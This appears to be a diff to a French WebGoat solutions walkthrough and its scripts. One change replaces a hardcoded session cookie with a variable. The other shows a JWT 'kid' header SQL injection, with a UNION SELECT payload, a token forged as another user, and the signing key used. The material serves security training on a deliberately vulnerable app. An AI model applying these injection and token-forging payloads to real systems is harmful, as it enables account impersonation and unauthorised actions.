@@ -318,7 +318,7 @@ def sql_injection_mitigation_10():
 	 index = 0  
   
 	 headers = {  
-		 'Cookie': 'JSESSIONID=id'  
+		 'Cookie': COOKIE,
 	 }  
   
 	 while True:  
@@ -505,7 +505,14 @@ jwt_tokens_5()
 *   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
 *   Sur WebGoat, cliquer sur **Delete**.
 *   Repérer la requête vers `delete` dans l'onglet _Réseau_ et cliquer sur _En-têtes_.
-*   Remarquer le paramètre `token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8`.
+*   Remarquer le paramètre :
+```
+token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOi
+JXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYX
+VkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycn
+kiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6i
+zOU638uUCi6UhiOJKYzoEZGE8
+```
 *   En base64, cela se décode en : `{"typ":"JWT","kid":"webgoat_key","alg":"HS256"}.{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}.signature`.
 *   Modifier les deux premières parties du token en `{"typ":"JWT","kid":"hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}` et `{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}`, puis recalculer la signature avec la clé `deletingTom`, avec le script Python ci-dessous par exemple.
 *   Le nouveau token est `eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScgZnJvbSBJTkZPUk1BVElPTl9TQ0hFTUEuU1lTVEVNX1VTRVJTIC0tIiwiYWxnIjoiSFMyNTYifQ.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.JrDpQmNiVI818UvOMQgRmPkZOetw7Ic1WbPvStS2B6U`.
